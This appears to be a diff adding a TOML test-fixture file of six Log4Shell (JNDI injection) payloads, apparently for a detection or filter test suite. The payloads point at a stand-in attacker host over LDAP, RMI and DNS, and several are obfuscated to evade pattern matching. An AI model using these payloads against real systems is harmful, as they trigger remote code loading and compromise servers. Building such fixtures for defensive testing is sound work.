@@ -1,0 +1,31 @@
+schema = 1
+
+[[case]]
+id = "jndi_ldap_basic"
+class = "log4shell"
+payload = "${jndi:ldap://attacker.example/a}"
+
+[[case]]
+id = "jndi_rmi"
+class = "log4shell"
+payload = "${jndi:rmi://attacker.example/a}"
+
+[[case]]
+id = "jndi_dns"
+class = "log4shell"
+payload = "${jndi:dns://attacker.example}"
+
+[[case]]
+id = "jndi_lower_obfuscation"
+class = "log4shell"
+payload = "${${lower:j}ndi:ldap://attacker.example/a}"
+
+[[case]]
+id = "jndi_double_dollar"
+class = "log4shell"
+payload = "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example/a}"
+
+[[case]]
+id = "jndi_envvar_default"
+class = "log4shell"
+payload = "${${env:NaN:-j}ndi:ldap://attacker.example/a}"
